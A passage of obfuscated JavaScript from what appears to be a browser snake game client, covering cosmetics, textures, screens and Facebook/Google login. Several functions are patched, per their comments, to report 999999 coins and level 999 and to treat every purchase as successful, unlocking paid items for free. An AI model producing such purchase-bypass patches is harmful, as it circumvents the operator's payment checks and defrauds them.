          this.Wh.Ad(_0xddf856.Hj, _0xddf856.Ij, _0x207b06.FoodSize * _0xddf856.Jj, _0xddf856.Lj * 1, _0x207b06.FoodShadow * _0x9dd4d4, _0x207b06.FoodTransparent * _0xddf856.Lj);
        }
      };
      var _0x432848 = function () {
        function _0x3f9f0d(_0x5e0427, _0xbcb7e3) {
          this.ld = _0x5e0427;
          this.md = _0xbcb7e3;
        }
        _0x3f9f0d.prototype.Ad = function (_0x2eaee9, _0x15a7c3, _0x38fefe, _0x5406c5, _0x1a427a, _0x10b552) {
          this.ld.Td(true);
          this.ld.Ud(_0x2eaee9, _0x15a7c3);
          this.ld.Bd(_0x38fefe);
          this.ld.Rj(_0x5406c5);
          this.md.Td(true);
          this.md.Ud(_0x2eaee9, _0x15a7c3);
          this.md.Bd(_0x1a427a);
          this.md.Rj(_0x10b552);
        };
        _0x3f9f0d.prototype.Cd = function () {
          this.ld.Td(false);
          this.md.Td(false);
        };
        return _0x3f9f0d;
      }();
      return _0x2b9ed3;
    }();
    _0x7f096e.Sj = function () {
      function _0x31b26c() {
        this.Tj = 0;
        this.Uj = 0;
        this.Vj = 0;
        this.Wj = 0;
        this.Xj = 0;
        this.Yj = [];
      }
      function _0x34fffb(_0x467a2b, _0x34a5dc) {
        for (var _0x53ef8f = 0; _0x53ef8f < _0x467a2b.length; _0x53ef8f++) {
          if (parseInt(_0x467a2b[_0x53ef8f].id) === _0x34a5dc) {
            return _0x53ef8f;
          }
        }
        ;
        return -1;
      }
      _0x31b26c.prototype.Sa = function () {};
      _0x31b26c.prototype.Zj = function (_0x796465) {
        if (!_0x207b06.loading) {
          _0x207b06.pm = {
            ...this
          };
          localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
        }
        switch (_0x796465) {
          case _0x7f096e._j.$j:
            return this.Tj;
          case _0x7f096e._j.ak:
            return this.Uj;
          case _0x7f096e._j.bk:
            return this.Vj;
          case _0x7f096e._j.ck:
            return this.Wj;
          case _0x7f096e._j.dk:
            return this.Xj;
        }
        ;
        return 0;
      };
      _0x31b26c.prototype.ek = function () {
        return new _0x7f096e.Sb(this.Tj, this.Uj, this.Vj, this.Wj, this.Xj);
      };
      _0x31b26c.prototype.fk = function (_0x778a64) {
        this.Yj.push(_0x778a64);
        this.gk();
      };
      _0x31b26c.prototype.hk = function () {
        if (!ooo.ud.Fc()) {
          return _0x331039.wa([32, 33, 34, 35]);
        }
        ;
        var _0x3f6b39 = [];
        for (var _0x589503 = ooo.ud.Gc().skinArrayDict, _0x199aa1 = 0; _0x199aa1 < _0x589503.length; _0x199aa1++) {
          var _0x65be18 = _0x589503[_0x199aa1];
          if (this.ik(_0x65be18.id, _0x7f096e._j.$j)) {
            _0x3f6b39.push(_0x65be18);
          }
        }
        ;
        if (_0x3f6b39.length === 0) {
          return 0;
        } else {
          return _0x3f6b39[parseInt(_0x3f6b39.length * _0x331039.ma())].id;
        }
      };
      _0x31b26c.prototype.jk = function () {
        if (ooo.ud.Fc()) {
          var _0x22dd38 = ooo.ud.Gc().skinArrayDict;
          var _0x10a719 = _0x34fffb(_0x22dd38, this.Tj);
          if (!(_0x10a719 < 0)) {
            for (var _0x540de8 = _0x10a719 + 1; _0x540de8 < _0x22dd38.length; _0x540de8++) {
              if (this.ik(_0x22dd38[_0x540de8].id, _0x7f096e._j.$j) && _0x22dd38[_0x540de8].g !== true) {
                this.Tj = _0x22dd38[_0x540de8].id;
                this.gk();
                return;
              }
            }
            ;
            for (var _0x5135b4 = 0; _0x5135b4 < _0x10a719; _0x5135b4++) {
              if (this.ik(_0x22dd38[_0x5135b4].id, _0x7f096e._j.$j) && _0x22dd38[_0x5135b4].g !== true) {
                this.Tj = _0x22dd38[_0x5135b4].id;
                this.gk();
                return;
              }
            }
          }
        }
      };
      _0x31b26c.prototype.kk = function () {
        if (ooo.ud.Fc) {
          var _0x590c08 = ooo.ud.Gc().skinArrayDict;
          var _0xd65f97 = _0x34fffb(_0x590c08, this.Tj);
          if (!(_0xd65f97 < 0)) {
            for (var _0x332ede = _0xd65f97 - 1; _0x332ede >= 0; _0x332ede--) {
              if (this.ik(_0x590c08[_0x332ede].id, _0x7f096e._j.$j) && _0x590c08[_0x332ede].g !== true) {
                this.Tj = _0x590c08[_0x332ede].id;
                this.gk();
                return;
              }
            }
            ;
            for (var _0x1cdbd4 = _0x590c08.length - 1; _0x1cdbd4 > _0xd65f97; _0x1cdbd4--) {
              if (this.ik(_0x590c08[_0x1cdbd4].id, _0x7f096e._j.$j) && _0x590c08[_0x1cdbd4].g !== true) {
                this.Tj = _0x590c08[_0x1cdbd4].id;
                this.gk();
                return;
              }
            }
          }
        }
      };
      _0x31b26c.prototype.lk = function (_0x191af3, _0x2eaf1d) {
        if (!ooo.ud.Fc() || this.ik(_0x191af3, _0x2eaf1d)) {
          switch (_0x2eaf1d) {
            case _0x7f096e._j.$j:
              if (this.Tj !== _0x191af3) {
                this.Tj = _0x191af3;
                this.gk();
              }
              return;
            case _0x7f096e._j.ak:
              if (this.Uj !== _0x191af3) {
                this.Uj = _0x191af3;
                this.gk();
              }
              return;
            case _0x7f096e._j.bk:
              if (this.Vj !== _0x191af3) {
                this.Vj = _0x191af3;
                this.gk();
              }
              return;
            case _0x7f096e._j.ck:
              if (this.Wj !== _0x191af3) {
                this.Wj = _0x191af3;
                this.gk();
              }
              return;
            case _0x7f096e._j.dk:
              if (this.Xj !== _0x191af3) {
                this.Xj = _0x191af3;
                this.gk();
              }
              return;
          }
        }
      };
      _0x31b26c.prototype.ik = function (_0xcd2650, _0x4f15cf) {
        var _0x837f80 = this.mk(_0xcd2650, _0x4f15cf);
        return _0x837f80 != null && (ooo.ok.nk() ? _0x837f80.pk() === 0 && !_0x837f80.qk() || ooo.ok.rk(_0xcd2650, _0x4f15cf) : _0x837f80.sk());
      };
      _0x31b26c.prototype.mk = function (_0x2ed86f, _0x126402) {
        if (!ooo.ud.Fc()) {
          return null;
        }
        ;
        var _0x3c928e = ooo.ud.Gc();
        if (_0x126402 === _0x7f096e._j.$j) {
          var _0x31756d = _0x34fffb(_0x3c928e.skinArrayDict, _0x2ed86f);
          if (_0x31756d < 0) {
            return null;
          } else {
            return _0x7f096e.uk.tk(_0x3c928e.skinArrayDict[_0x31756d]);
          }
        }
        ;
        var _0xa6c93d = null;
        switch (_0x126402) {
          case _0x7f096e._j.ak:
            _0xa6c93d = _0x3c928e.eyesDict[_0x2ed86f];
            break;
          case _0x7f096e._j.bk:
            _0xa6c93d = _0x3c928e.mouthDict[_0x2ed86f];
            break;
          case _0x7f096e._j.ck:
            _0xa6c93d = _0x3c928e.hatDict[_0x2ed86f];
            break;
          case _0x7f096e._j.dk:
            _0xa6c93d = _0x3c928e.glassesDict[_0x2ed86f];
        }
        ;
        if (_0xa6c93d != null) {
          return _0x7f096e.uk.vk(_0xa6c93d);
        } else {
          return null;
        }
      };
      _0x31b26c.prototype.gk = function () {
        for (var _0x3d935d = 0; _0x3d935d < this.Yj.length; _0x3d935d++) {
          this.Yj[_0x3d935d]();
        }
      };
      return _0x31b26c;
    }();
    _0x7f096e._j = function () {
      function _0x4c57e1() {}
      _0x4c57e1.$j = "SKIN";
      _0x4c57e1.ak = "EYES";
      _0x4c57e1.bk = "MOUTH";
      _0x4c57e1.dk = "GLASSES";
      _0x4c57e1.ck = "HAT";
      return _0x4c57e1;
    }();
    _0x7f096e.wk = function () {
      function _0x53235c() {
        this.fn_o = _0x4cb377;
        this.ig = new _0x4ead11.k.n(_0x4ead11.k.m.from("/images/bg-obstacle.png"));
        this.F_bg = new _0x4ead11.k.n(_0x4cb377());
        var _0x176346;
        var _0x285466;
        var _0x5768e2;
        var _0x519c8c;
        var _0x442f08 = _0x4ead11.k.m.from(atob(_0x56e2a2[23]) || _0x494ea6.H.N);
        var _0x44e917 = new _0x4ead11.k.n(_0x442f08, new _0x4ead11.k.r(0, 0, 256, 256));
        var _0x4a5d99 = new _0x4ead11.k.n(_0x442f08, new _0x4ead11.k.r(352, 96, 64, 64));
        this.jg = Array(16);
        for (var _0x19ca1e = 0; _0x19ca1e < this.jg.length; _0x19ca1e++) {
          this.jg[_0x19ca1e] = _0x19ca1e % 2 == 0 ? _0x44e917 : _0x4a5d99;
        }
        ;
        this.Ih = new _0x4ead11.k.n(((_0x176346 = _0x4ead11.k.m.from("/images/bg-pattern-pow2-ARENA.png")).wrapMode = _0x4ead11.k.C.D, _0x176346));
        this.Jh = new _0x4ead11.k.n(((_0x285466 = _0x4ead11.k.m.from("/images/bg-pattern-pow2-TEAM2.png")).wrapMode = _0x4ead11.k.C.D, _0x285466));
        this.Gh = new _0x4ead11.k.n(_0x4ead11.k.m.from("/images/lens.png"));
        this.$f = new _0x4ead11.k.n(((_0x5768e2 = _0x4ead11.k.m.from(_0x494ea6.H.O)).wrapMode = _0x4ead11.k.C.D, _0x5768e2));
        this.mc = ((_0x519c8c = _0x7f096e.d.createElement("canvas")).width = 80, _0x519c8c.height = 80, {
          nc: _0x519c8c,
          oc: _0x519c8c.getContext("2d"),
          Za: new _0x4ead11.k.n(_0x4ead11.k.m.from(_0x519c8c))
        });
        this.hf = {};
        this.df = {};
        this.xk = [];
        this.yk = null;
      }
      function _0x4cb377(_0xeb9c9b) {
        (_0xeb9c9b = _0x4ead11.k.m.from(_0xeb9c9b || _0x207b06.background || "/images/bg-pattern-pow2-ARENA.png")).wrapMode = _0x4ead11.k.C.D;
        return _0xeb9c9b;
      }
      _0x53235c.prototype.Sa = function (_0x15f8d8) {
        function _0x3dd187() {
          if (--_0x50587b == 0) {
            _0x15f8d8();
          }
        }
        var _0x50587b = 4;
        this.hf = {};
        _0x3dd187();
        this.df = {};
        _0x3dd187();
        this.xk = [];
        _0x3dd187();
        this.yk = null;
        _0x3dd187();
      };
      return _0x53235c;
    }();
    _0x7f096e.zk = function () {
      function _0x59e581() {
        this.Ak = null;
        this.Kf = new _0x7f096e.Bk();
        this.Jf = new _0x7f096e.Ck();
        this.Dk = new _0x7f096e.Ek();
        this.Fk = new _0x7f096e.Gk();
        this.Hk = new _0x7f096e.Ik();
        this.Jk = new _0x7f096e.Kk();
        this.Lk = new _0x7f096e.Mk();
        this.Nk = new _0x7f096e.Ok();
        this.Hi = new _0x7f096e.Pk();
        this.Qk = new _0x7f096e.Rk();
        this.Sk = new _0x7f096e.Tk();
        this.Uk = new _0x7f096e.Vk();
        this.Wk = new _0x7f096e.Xk();
        this.Yk = new _0x7f096e.Zk();
        this.Re = new _0x7f096e.$k();
        this._k = new _0x7f096e.al();
        this.bl = new _0x7f096e.cl();
        this.dl = new _0x7f096e.el();
        this.fl = [];
      }
      function _0x4840d7(_0x5e3164, _0x5f084a) {
        if (_0x5f084a !== _0x5e3164.length + 1) {
          var _0x35a3ee = _0x5e3164[_0x5f084a];
          _0x331039.ua(_0x5e3164, _0x5f084a + 1, _0x5f084a, _0x5e3164.length - _0x5f084a - 1);
          _0x5e3164[_0x5e3164.length - 1] = _0x35a3ee;
        }
      }
      _0x59e581.prototype.Sa = function () {
        this.Ak = new _0x7f096e.Nf(_0x7f096e.Uf.Tf);
        this.fl = [this.Kf, this.Jf, this.Dk, this.Fk, this.Hk, this.Jk, this.Lk, this.Nk, this.Hi, this.Qk, this.Sk, this.Uk, this.Wk, this.Yk, this.Re, this._k, this.bl, this.dl];
        for (var _0x4c055d = 0; _0x4c055d < this.fl.length; _0x4c055d++) {
          this.fl[_0x4c055d].Sa();
        }
      };
      _0x59e581.prototype.Uh = function (_0x4eae46, _0x252f02) {
        for (var _0x1cc404 = this.fl.length - 1; _0x1cc404 >= 0; _0x1cc404--) {
          this.fl[_0x1cc404].ug(_0x4eae46, _0x252f02);
        }
        ;
        if (this.fl[0] !== this.Kf && this.fl[0] !== this.dl && this.Ak != null) {
          this.Ak.ug(_0x4eae46, _0x252f02);
        }
      };
      _0x59e581.prototype.qg = function () {
        for (var _0x42621b = this.fl.length - 1; _0x42621b >= 0; _0x42621b--) {
          this.fl[_0x42621b].qg();
        }
        ;
        if (this.Ak != null) {
          this.Ak.qg();
        }
      };
      _0x59e581.prototype.gl = function (_0xe62041) {
        var _0x257ad2 = function _0x34710d(_0x5456ba, _0x401947) {
          for (var _0x59e85d = 0; _0x59e85d < _0x5456ba.length; _0x59e85d++) {
            if (_0x5456ba[_0x59e85d] === _0x401947) {
              return _0x59e85d;
            }
          }
          ;
          return -1;
        }(this.fl, _0xe62041);
        if (!(_0x257ad2 < 0)) {
          this.fl[0].hl();
          (function _0x1f9765(_0xb69fec, _0x512e91) {
            if (_0x512e91 !== 0) {
              var _0x25aa86 = _0xb69fec[_0x512e91];
              _0x331039.ua(_0xb69fec, 0, 1, _0x512e91);
              _0xb69fec[0] = _0x25aa86;
            }
          })(this.fl, _0x257ad2);
          this.il();
        }
      };
      _0x59e581.prototype.jl = function () {
        this.fl[0].hl();
        do {
          _0x4840d7(this.fl, 0);
        } while (this.fl[0].Wd !== _0x7f096e.ll.kl);
        ;
        this.il();
      };
      _0x59e581.prototype.il = function () {
        var _0x349e36 = this.fl[0];
        _0x349e36.ml();
        _0x349e36.nl();
        this.ol();
      };
      _0x59e581.prototype.pl = function () {
        return this.fl.length !== 0 && this.fl[0].Wd === _0x7f096e.ll.kl && this.Yk.ql();
      };
      _0x59e581.prototype.rl = function () {
        if (this.fl.length === 0) {
          return null;
        } else {
          return this.fl[0];
        }
      };
      _0x59e581.prototype.ol = function () {
        if (this.pl()) {
          this.gl(this.Yk);
        }
      };
      return _0x59e581;
    }();
    _0x7f096e.vj = function () {
      function _0x5390ec() {
        this.ii = [];
        this.fi = [];
      }
      _0x5390ec.wj = function (_0x50ec32, _0x1ca11f) {
        return {
          ji: _0x50ec32,
          hi: _0x1ca11f
        };
      };
      _0x5390ec.xj = function (_0x277114, _0x5b7b8b) {
        return {
          gi: _0x277114,
          hi: _0x5b7b8b
        };
      };
      return _0x5390ec;
    }();
    _0x7f096e.sl = function () {
      function _0x5df90e() {
        this.tl = [];
        this.ul = [];
        this.vl = false;
        this.wl = _0x59f79f;
        this.xl = {};
      }
      var _0x59f79f = "guest";
      var _0xb1368d = "guest";
      var _0x2ac911 = "fb";
      var _0x5415fe = "gg";
      _0x5df90e.yl = new (function () {
        function _0x329790() {}
        _0x329790.zl = function _0x549a4a(_0x5597bf) {
          this.Al = _0x5597bf;
        };
        _0x329790.prototype.Bl = function () {
          return (typeof FB == "undefined" ? "undefined" : _typeof(FB)) != "undefined";
        };
        _0x329790.prototype.Cl = function (_0x2e7833, _0x4af366, _0x212fe5) {
          var _0x546e5f = "https://graph.facebook.com/me?access_token=" + _0x2e7833;
          $.get(_0x546e5f).fail(function () {
            _0x4af366();
          }).done(function () {
            _0x212fe5();
          });
        };
        _0x329790.prototype.Dl = function (_0x137dae, _0x2c69cf) {
          if (!this.Bl()) {
            _0x137dae();
            return;
          }
          ;
          this.El(function () {
            FB.login(function (_0x4fd27d) {
              if (_0x4fd27d.status !== "connected") {
                _0x137dae();
                return;
              }
              ;
              var _0x25c6ae = _0x4fd27d.authResponse.accessToken;
              _0x2c69cf(new _0x329790.zl(_0x25c6ae));
            });
          }, function (_0xe5b7b5) {
            _0x2c69cf(_0xe5b7b5);
          });
        };
        _0x329790.prototype.El = function (_0x3260c9, _0x3f88f6) {
          var _0x562d09 = this;
          if (!this.Bl()) {
            _0x3260c9();
            return;
          }
          ;
          FB.getLoginStatus(function (_0xae453c) {
            if (_0xae453c.status !== "connected") {
              _0x3260c9();
              return;
            }
            ;
            var _0x526f8c = _0xae453c.authResponse.accessToken;
            _0x562d09.Cl(_0x526f8c, function () {
              _0x3260c9();
            }, function () {
              _0x3f88f6(new _0x329790.zl(_0x526f8c));
            });
          });
        };
        _0x329790.prototype.Fl = function () {
          if (this.Bl()) {
            FB.logout();
          }
        };
        return _0x329790;
      }())();
      _0x5df90e.Gl = new (function () {
        function _0x2e663f() {}
        _0x2e663f.Hl = function _0x3df691(_0x54fa62, _0x26d076) {
          this.Al = _0x54fa62;
          this.Il = _0x26d076;
        };
        _0x2e663f.prototype.Bl = function () {
          return _typeof(GoogleAuth) != "undefined";
        };
        _0x2e663f.prototype.Dl = function (_0x4a7490, _0x4ec4af) {
          if (_typeof(GoogleAuth) == "undefined") {
            _0x4a7490();
            return;
          }
          ;
          GoogleAuth.then(function () {
            if (GoogleAuth.isSignedIn.get()) {
              var _0x28790a = GoogleAuth.currentUser.get();
              var _0x313cf8 = _0x28790a.getAuthResponse().id_token;
              var _0x27aca0 = new Date().getTime() + _0x28790a.getAuthResponse().expires_in * 1000;
              if (new Date().getTime() < _0x27aca0) {
                _0x4ec4af(new _0x2e663f.Hl(_0x313cf8, _0x27aca0));
                return;
              }
            }
            ;
            GoogleAuth.signIn().then(function (_0x337111) {
              if (_typeof(_0x337111.error) !== "undefined" || !_0x337111.isSignedIn()) {
                _0x4a7490();
                return;
              }
              ;
              var _0x499e89 = _0x337111.getAuthResponse().id_token;
              var _0x393bff = new Date().getTime() + _0x337111.getAuthResponse().expires_in * 1000;
              _0x4ec4af(new _0x2e663f.Hl(_0x499e89, _0x393bff));
            });
          });
        };
        _0x2e663f.prototype.El = function (_0x295cc2, _0x251fd4) {
          if (_typeof(GoogleAuth) == "undefined") {
            _0x295cc2();
            return;
          }
          ;
          GoogleAuth.then(function () {
            if (GoogleAuth.isSignedIn.get()) {
              var _0x778ea4 = GoogleAuth.currentUser.get();
              var _0x3706bb = _0x778ea4.getAuthResponse().id_token;
              var _0x28ee3f = new Date().getTime() + _0x778ea4.getAuthResponse().expires_in * 1000;
              if (new Date().getTime() < _0x28ee3f) {
                _0x251fd4(new _0x2e663f.Hl(_0x3706bb, _0x28ee3f));
                return;
              }
            }
            ;
            _0x295cc2();
          });
        };
        _0x2e663f.prototype.Fl = function () {
          if (_typeof(GoogleAuth) != "undefined") {
            GoogleAuth.signOut();
          }
        };
        return _0x2e663f;
      }())();
      _0x5df90e.prototype.Sa = function () {
        this.Jl();
      };
      _0x5df90e.prototype.Kl = function () {
        if (this.vl) {
          return this.xl.userId;
        } else {
          return "";
        }
      };
      _0x5df90e.prototype.Ll = function () {
        if (this.vl) {
          return this.xl.username;
        } else {
          return "";
        }
      };
      _0x5df90e.prototype.Ml = function () {
        if (this.vl) {
          return this.xl.nickname;
        } else {
          return "";
        }
      };
      _0x5df90e.prototype.Nl = function () {
        if (this.vl) {
          return this.xl.avatarUrl;
        } else {
          return _0x494ea6.H.M;
        }
      };
      _0x5df90e.prototype.Ol = function () {
        return true;
      };
      _0x5df90e.prototype.Pl = function () {
        return true;
      };
      _0x5df90e.prototype.Ql = function () {
        // Give unlimited coins to make everything free
        return 999999;
      };
      _0x5df90e.prototype.Rl = function () {
        // Give maximum level to unlock all content
        return 999;
      };
      _0x5df90e.prototype.Sl = function () {
        // Give maximum experience
        return 999999;
      };
      _0x5df90e.prototype.Tl = function () {
        // Set experience to next level to 0 (already maxed)
        return 0;
      };
      _0x5df90e.prototype.Ul = function () {
        if (this.vl) {
          return this.xl.skinId;
        } else {
          return 0;
        }
      };
      _0x5df90e.prototype.Vl = function () {
        if (this.vl) {
          return this.xl.eyesId;
        } else {
          return 0;
        }
      };
      _0x5df90e.prototype.Wl = function () {
        if (this.vl) {
          return this.xl.mouthId;
        } else {
          return 0;
        }
      };
      _0x5df90e.prototype.Xl = function () {
        if (this.vl) {
          return this.xl.glassesId;
        } else {
          return 0;
        }
      };
      _0x5df90e.prototype.Yl = function () {
        if (this.vl) {
          return this.xl.hatId;
        } else {
          return 0;
        }
      };
      _0x5df90e.prototype.Zl = function () {
        if (this.vl) {
          return this.xl.highScore;
        } else {
          return 0;
        }
      };
      _0x5df90e.prototype.$l = function () {
        if (this.vl) {
          return this.xl.bestSurvivalTimeSec;
        } else {
          return 0;
        }
      };
      _0x5df90e.prototype._l = function () {
        if (this.vl) {
          return this.xl.kills;
        } else {
          return 0;
        }
      };
      _0x5df90e.prototype.am = function () {
        if (this.vl) {
          return this.xl.headShots;
        } else {
          return 0;
        }
      };
      _0x5df90e.prototype.bm = function () {
        if (this.vl) {
          return this.xl.sessionsPlayed;
        } else {
          return 0;
        }
      };
      _0x5df90e.prototype.cm = function () {
        if (this.vl) {
          return this.xl.totalPlayTimeSec;
        } else {
          return 0;
        }
      };
      _0x5df90e.prototype.dm = function () {
        if (this.vl) {
          return this.xl.regDate;
        } else {
          return {};
        }
      };
      _0x5df90e.prototype.em = function (_0x1f0fa6) {
        this.tl.push(_0x1f0fa6);
        _0x1f0fa6();
      };
      _0x5df90e.prototype.fm = function (_0x45bb03) {
        this.ul.push(_0x45bb03);
        _0x45bb03();
      };
      _0x5df90e.prototype.rk = function (_0x191a12, _0x3d11f0) {
        var _0x3ad531 = this.xl.propertyList.concat(_0x207b06.pL || []);
        if (_0x3ad531 == null) {
          return false;
        }
        ;
        for (_0xb1368d = 0; _0xb1368d < _0x3ad531.length; _0xb1368d++) {
          var _0x5e6f2b = _0x3ad531[_0xb1368d];
          if (_0x5e6f2b.id == _0x191a12 && _0x5e6f2b.type === _0x3d11f0) {
            return true;
          }
        }
        ;
        return false;
      };
      _0x5df90e.prototype.nk = function () {
        return this.vl;
      };
      _0x5df90e.prototype.gm = function () {
        return this.wl;
      };
      _0x5df90e.prototype.hm = function (_0x272479) {
        var _0x117c99 = this;
        var _0x2dbbb1 = this.Kl();
        var _0x3c1ca6 = this.Ql();
        var _0x5213d7 = this.Rl();
        this.im(function () {
          if (_0x272479 != null) {
            _0x272479();
          }
        }, function (_0x3794b3) {
          _0x117c99.xl = _0x3794b3.user_data;
          _0x117c99.jm();
          var _0x38faa0 = _0x117c99.Kl();
          var _0xd1f5d = _0x117c99.Ql();
          var _0x2005fa = _0x117c99.Rl();
          if (_0x2dbbb1 === _0x38faa0) {
            if (_0x2005fa > 1 && _0x2005fa !== _0x5213d7) {
              ooo.Xg.Yk.km(new _0x7f096e.lm(_0x2005fa));
            }
            var _0x49034c = _0xd1f5d - _0x3c1ca6;
            if (_0x49034c >= 20) {
              ooo.Xg.Yk.km(new _0x7f096e.mm(_0x49034c));
            }
          }
          ;
          if (_0x272479 != null) {
            _0x272479();
          }
        });
      };
      _0x5df90e.prototype.im = function (_0x6ef67b, _0x2adc6f) {
        var _0x203b64 = _0x494ea6.H.J + "/pub/wuid/" + this.wl + "/getUserData";
        _0x331039.Aa(_0x203b64, _0x6ef67b, function (_0x27a019) {
          if (_0x27a019.code !== 1200) {
            _0x6ef67b();
          } else {
            _0x2adc6f(_0x27a019);
          }
        });
      };
      _0x5df90e.prototype.nm = function (_0x22b04e, _0x39c066, _0x187267, _0x11a44b) {
        // All items are now free - immediately call success callback
        _0x187267();
      };
      _0x5df90e.prototype.om = function (_0x3219cd, _0x11312a) {
        var _0x181902 = _0x494ea6.H.J + "/pub/wuid/" + this.wl + "/deleteAccount";
        _0x331039.Aa(_0x181902, _0x3219cd, function (_0x186d93) {
          if (_0x186d93.code !== 1200) {
            _0x3219cd();
          } else {
            _0x11312a();
          }
        });
      };
      _0x5df90e.prototype.pm = function (_0x12feda) {
        var _0x4ee457 = this;
        if (this.vl) {
          this.qm();
        }
        _0x5df90e.yl.Dl(function () {
          _0x12feda();
        }, function (_0x5ee739) {
          _0x4ee457.rm(_0x2ac911, _0x5ee739.Al, _0x12feda);
        });
      };
      _0x5df90e.prototype.sm = function (_0x3ac02d) {
        var _0xb4e2aa = this;
        if (this.vl) {
          this.qm();
        }
        _0x5df90e.Gl.Dl(function () {
          _0x3ac02d();
        }, function (_0x114337) {
          _0xb4e2aa.rm(_0x5415fe, _0x114337.Al, _0x3ac02d);
        });
      };
      _0x5df90e.prototype.rm = function (_0x5dbd1f, _0x556082, _0x502f57) {
        var _0x894f99 = this;
        var _0x39ddd7 = _0x5dbd1f + "_" + _0x556082;
        var _0x4e87b6 = _0x494ea6.H.J + "/pub/wuid/" + _0x39ddd7 + "/login";
        _0x331039.Aa(_0x4e87b6, function () {
          _0x894f99.tm();
        }, function (_0x3df2b2) {
          if (_0x3df2b2.code !== 1200) {
            _0x894f99.tm();
          } else {
            _0x894f99.um(_0x5dbd1f, _0x556082, _0x3df2b2.user_data);
            if (_0x502f57 != null) {
              _0x502f57();
            }
          }
        });
      };
      _0x5df90e.prototype.qm = function () {
        try {
          this.vm();
          this.wm();
        } catch (_0x4b4f6c) {}
        ;
        this.xm();
      };
      _0x5df90e.prototype.ym = function () {
        if (this.vl) {
          this.om(function () {}, function () {});
        }
      };
      _0x5df90e.prototype.tm = function () {
        ooo.Xg.gl(ooo.Xg._k);
      };
      _0x5df90e.prototype.um = function (_0x4a390d, _0x5f88c8, _0x8b3056) {
        var _0x19a088 = this;
        _0x3165ec(_0x8b3056, function (_0x434f69) {
          var _0x5f1fec = _0x19a088.vl ? _0x19a088.xl.userId : _0x434f69;
          _0x19a088.vl = true;
          _0x19a088.wl = _0x4a390d + "_" + _0x5f88c8;
          _0x19a088.xl = _0x434f69;
          _0x7f096e.Cg.Ng(_0x7f096e.Cg.Hg, _0x4a390d, 60);
          if (_0x5f1fec !== _0x19a088.xl.userId) {
            _0x19a088.zm();
          } else {
            _0x19a088.jm();
          }
          ooo.Xp(true, true);
          _0x207b06.loading = false;
        });
      };
      _0x5df90e.prototype.xm = function () {
        var _0xafcc61 = this.vl ? this.xl.userId : _0xb1368d;
        this.vl = false;
        this.wl = _0x59f79f;
        this.xl = {};
        _0x7f096e.Cg.Ng(_0x7f096e.Cg.Hg, "", 60);
        if (_0xafcc61 !== this.xl.userId) {
          this.zm();
        } else {
          this.jm();
        }
      };
      _0x5df90e.prototype.Jl = function () {
        var _0x380622 = _0x7f096e.Cg.Og(_0x7f096e.Cg.Hg);
        var _0x584386 = this;
        if (_0x2ac911 === _0x380622) {
          var _0x9ece73 = 1;
          (function _0x5898fe() {
            if (!_0x5df90e.yl.Bl() && _0x9ece73++ < 5) {
              _0x331039.Y(_0x5898fe, 1000);
              return;
            }
            ;
            _0x5df90e.yl.El(function () {}, function (_0x45ecb0) {
              _0x584386.rm(_0x2ac911, _0x45ecb0.Al);
            });
          })();
        } else if (_0x5415fe === _0x380622) {
          var _0x28a997 = 1;
          (function _0x3469f9() {
            if (!_0x5df90e.Gl.Bl() && _0x28a997++ < 5) {
              _0x331039.Y(_0x3469f9, 1000);
              return;
            }
            ;
            _0x5df90e.Gl.El(function () {}, function (_0x132bc9) {
              _0x584386.rm(_0x5415fe, _0x132bc9.Al);
            });
          })();
        }
      };
      _0x5df90e.prototype.zm = function () {
        for (var _0x7786aa = 0; _0x7786aa < this.tl.length; _0x7786aa++) {
          this.tl[_0x7786aa]();
        }
        ;
        this.jm();
      };
      _0x5df90e.prototype.jm = function () {
        for (var _0x565a8c = 0; _0x565a8c < this.ul.length; _0x565a8c++) {
          this.ul[_0x565a8c]();
        }
      };
      _0x5df90e.prototype.vm = function () {
        _0x5df90e.yl.Fl();
      };
      _0x5df90e.prototype.wm = function () {
        _0x5df90e.Gl.Fl();
      };
      return _0x5df90e;
    }();
    _0x7f096e.Sf = function () {
      function _0x141093(_0x530ce2, _0xf0c844, _0x148c56) {
        this.Of = _0x148c56;
        this.Rd = false;
        this.Yc = new _0x4ead11.k.l();
        this.Yc.visible = false;
        this.Am = Array(_0x530ce2);
        for (var _0x59771a = 0; _0x59771a < this.Am.length; _0x59771a++) {
          var _0x549e7e = new _0x7f096e.Bm(new _0x4ead11.j(_0xf0c844 * 3));
          _0x549e7e.Cm(_0xf0c844);
          this.Am[_0x59771a] = _0x549e7e;
          this.Yc.addChild(_0x549e7e.ag());
        }
        ;
        this.Pf = 1;
        this.Qf = 1;
        this.qg();
      }
      _0x141093.prototype.ag = function () {
        return this.Yc;
      };
      _0x141093.prototype.rg = function (_0x3332b7) {
        this.Rd = _0x3332b7;
        this.Yc.visible = _0x3332b7;
      };
      _0x141093.prototype.qg = function () {
        this.Pf = this.Of.width();
        this.Qf = this.Of.height();
        var _0x5d1d50 = this.Qf / 30;
        for (var _0x1ca2b9 = 0; _0x1ca2b9 < this.Am.length; _0x1ca2b9++) {
          this.Am[_0x1ca2b9].Dm(_0x5d1d50);
        }
      };
      _0x141093.prototype.Bg = function () {
        if (this.Rd) {
          for (var _0x3531c7 = 0; _0x3531c7 < this.Am.length; _0x3531c7++) {
            this.Am[_0x3531c7].Bg(this.Vf);
          }
        }
      };
      _0x141093.prototype.Em = function () {
        return this.Pf;
      };
      _0x141093.prototype.Fm = function () {
        return this.Qf;
      };
      _0x141093.prototype.xg = function (_0x4d6982, _0x28e6ce) {
        this.Am[_0x4d6982].Gm(_0x28e6ce);
      };
      _0x141093.prototype.yg = function (_0x6e5410, _0x4531ff) {
        this.Am[_0x6e5410].Hm(_0x4531ff);
      };
      _0x141093.prototype.zg = function (_0x5a3c95, _0x46bd73, _0x57d5c7) {
        var _0x565534 = this.Am[_0x5a3c95];
        for (var _0x255e42 = _0x565534.Im(), _0x55b0f8 = _0x565534.Jm, _0x8224c9 = 0; _0x8224c9 < _0x255e42; _0x8224c9++) {
          _0x55b0f8[_0x8224c9 * 3] = _0x46bd73;
          _0x55b0f8[_0x8224c9 * 3 + 1] = _0x57d5c7;
          _0x55b0f8[_0x8224c9 * 3 + 2] = 0;
        }
      };
      _0x141093.prototype.Ag = function (_0x1af3d, _0x24837c, _0x4e8cb4) {
        var _0x3bb816;
        var _0xbe547a;
        var _0x207c73 = this.Am[_0x1af3d];
        var _0x5410f6 = _0x207c73.Im();
        var _0x46a8d8 = _0x207c73.Jm;
        var _0x3ec417 = _0x207c73.Km();
        var _0x5c4b3a = _0x46a8d8[0];
        var _0xcc2df5 = _0x46a8d8[1];
        var _0x43c529 = _0x24837c - _0x5c4b3a;
